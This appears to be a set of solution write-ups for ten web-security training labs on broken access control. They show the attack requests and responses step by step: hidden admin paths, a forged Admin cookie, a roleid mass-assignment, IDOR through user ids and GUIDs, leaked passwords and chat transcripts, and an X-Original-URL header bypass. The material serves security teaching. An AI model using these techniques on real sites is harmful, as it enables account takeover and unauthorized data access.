# Lab 1

## Description

This lab has an unprotected admin panel.

Solve the lab by deleting the user `carlos`.

## Solution

`robots.txt` contains:

```
/administrator-panel
```

heading to this URL shows the admin panel without needing auth -> deleting the user `carlos` solves the lab.


# Lab 2

## Description

This lab has an unprotected admin panel. It's located at an unpredictable location, but the location is disclosed somewhere in the application.

Solve the lab by accessing the admin panel, and using it to delete the user `carlos`.

## Solution

HTML source code reveals:

```
|   |
|---|
|<script>|
||var isAdmin = false;|
||if (isAdmin) {|
||var topLinksTag = document.getElementsByClassName("top-links")[0];|
||var adminPanelTag = document.createElement('a');|
||adminPanelTag.setAttribute('href', '/admin-uaqfu3');|
||adminPanelTag.innerText = 'Admin panel';|
||topLinksTag.append(adminPanelTag);|
||var pTag = document.createElement('p');|
||pTag.innerText = '\|';|
||topLinksTag.appendChild(pTag);|
||}|
||</script>|
```

heading to:

```
/admin-uaqfu3
```

shows the admin panel. Deleting user `carlos` solve the lab.


# Lab 3

## Description

This lab has an admin panel at `/admin`, which identifies administrators using a forgeable cookie.

Solve the lab by accessing the admin panel and using it to delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

Logging in as user `wiener` and looking at cookies shows:

```
Cookie: Admin=false; session=CRWo4PyEFyv0d6EGo2i5NRjOwocG82hK
```

Heading to `/admin` page returns:

```
401 Unauthorized
```

Changing the cookie to:

```
Cookie: Admin=true; session=CRWo4PyEFyv0d6EGo2i5NRjOwocG82hK
```

returns:

```
200 OK
```

with the same cookie head to:

```
/admin/delete?username=carlos
```

to delete user `carlos` and solve the lab.


# Lab 4

## Description

This lab has an admin panel at `/admin`. It's only accessible to logged-in users with a `roleid` of 2.

Solve the lab by accessing the admin panel and using it to delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

Logging in as user `wiener` and heading to account shows the possibility to change the mail address of the user via following request:

```
POST /my-account/change-email HTTP/2
[...]
{"email":"wiener@admin-user.net"}
```

which returns:

```
HTTP/2 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 125

{
  "username": "wiener",
  "email": "wiener@admin-user.net",
  "apikey": "5382scHHVQ97VBVZw3FzbIQ5tYrzQATh",
  "roleid": 1
}
```

The user has `roleid` = 1. Trying to change this value to `2` with:

```
POST /my-account/change-email HTTP/2
[...]

{"email":"wiener@admin-user.net",
"roleid":2}
```

is successful:

```
HTTP/2 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 125

{
  "username": "wiener",
  "email": "wiener@admin-user.net",
  "apikey": "5382scHHVQ97VBVZw3FzbIQ5tYrzQATh",
  "roleid": 2
}
```


To solve the lab head to the now accessible admin panel and delete user `carlos`.


# Lab 5

## Description

This lab has a horizontal privilege escalation vulnerability on the user account page.

To solve the lab, obtain the API key for the user `carlos` and submit it as the solution.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

Logging in as user `wiener` and heading to account page via:

```
GET /my-account?id=wiener
```

shows the API key of the user. Testing with:

```
GET /my-account?id=carlos
```

shows the API key of user `carlos`. To solve the lab submit the API key.


# Lab 6

## Description

This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs.

To solve the lab, find the GUID for `carlos`, then submit his API key as the solution.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

Logging in as user `wiener` and heading to profile via:

```
GET /my-account?id=762c496c-fc9f-472a-a2d5-2113c4f86621
```

to find the `id` of user `carlos` find a blog post of that user:

```
/post?postId=9
```

shows:

```
<a href="/blogs?userId=d463feae-a8c4-4a1b-9696-d67f635985dd">carlos</a>
```

Using this GUID value in the previous request:

```
GET /my-account?id=d463feae-a8c4-4a1b-9696-d67f635985dd
```

shows the API key of user `carlos`. Submit that key to solve the lab.


# Lab 7

## Description

This lab contains an access control vulnerability where sensitive information is leaked in the body of a redirect response.

To solve the lab, obtain the API key for the user `carlos` and submit it as the solution.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

Logging as user `wiener` and heading to profile page via:

```
GET /my-account?id=wiener
```

and returns:

```
200 OK
[Content of profile]
```

Changing the request to:

```
GET /my-account?id=carlos
```

returns:

```
301 redirect
[Content of profile]
```

The API key of user `carlos` is shown in the profile content. Submitting the API key solves the lab.


# Lab 8

## Description

This lab has user account page that contains the current user's existing password, prefilled in a masked input.

To solve the lab, retrieve the administrator's password, then use it to delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

Login to the given account and inspecting requests made shows:

```
GET /my-account?id=wiener
```

which shows the users password in password field:

```
[...]
<input required type=password name=password value='peter'/>
[...]
```

Heading to:

```
GET /my-account?id=administrator
```

reveals:

```
[...]
<input required type=password name=password value='rzsso55fnmubsdejimhn'/>
[...]
```

which shows the actual `administrator` password.

Login  in as `administrator` and heading to admin panel `/admin` and deleting user `carlos` solves the lab.


# Lab 9

## Description

This lab stores user chat logs directly on the server's file system, and retrieves them using static URLs.

Solve the lab by finding the password for the user `carlos`, and logging into their account.

## Solution

Heading to `live chat` and  clicking on `View transcript` shows chat history of the current chat. Looking at backend requests shows:

```
POST /download-transcript
[...]
------WebKitFormBoundaryFI2QZcPBOaFOevhi
Content-Disposition: form-data; name="transcript"

CONNECTED: -- Now chatting with Hal Pline --<br/>You: hello<br/>Hal Pline: What did your last slave machine die of?
------WebKitFormBoundaryFI2QZcPBOaFOevhi--
```

which returns:

```
HTTP/2 302 Found
Location: /download-transcript/2.txt
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

which redirects:

```
GET /download-transcript/2.txt
```

and shows:

```
[...]
CONNECTED: -- Now chatting with Hal Pline --<br/>You: hello<br/>Hal Pline: What did your last slave machine die of?
```

Now, given the current transcript is in file `2.txt`, let's check `1.txt`:

```
GET /download-transcript/1.txt
```

returns:

```
[...]
Ok so my password is 94ivy2cj8fuvedq9nf28. Is that right?
[...]
```

Which shows the password of user `carlos` and solves the lab.


# Lab 10

## Description

This website has an unauthenticated admin panel at `/admin`, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the `X-Original-URL` header.

To solve the lab, access the admin panel and delete the user `carlos`.

## Solution

Heading to the `/admin` panel returns:

```
HTTP/2 403 Forbidden
[...]
"Access denied"
```

As the description suggests, the block is just a frontend blockage. As the backend supports the header `X-Original-URL`, heading to `/`, sending the request to repeater and adding the header `X-Original-URL` to the request with value `/admin` returns the admin panel:

```
HTTP/2 200 OK
[...]
<a href="/admin/delete?username=carlos">Delete</a>
[...]
```

containing the delete link for user `carlos`. Changing the header to:

```
GET / HTTP/2
[...]
X-Original-Url: /admin/delete?username=carlos
[...]
```

returns:

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 30

"Missing parameter 'username'"
```

adjusting the request to:

```
GET /?username=carlos HTTP/2
[...]
X-Original-Url: /admin/delete
[...]
```

and sending it solves the lab.


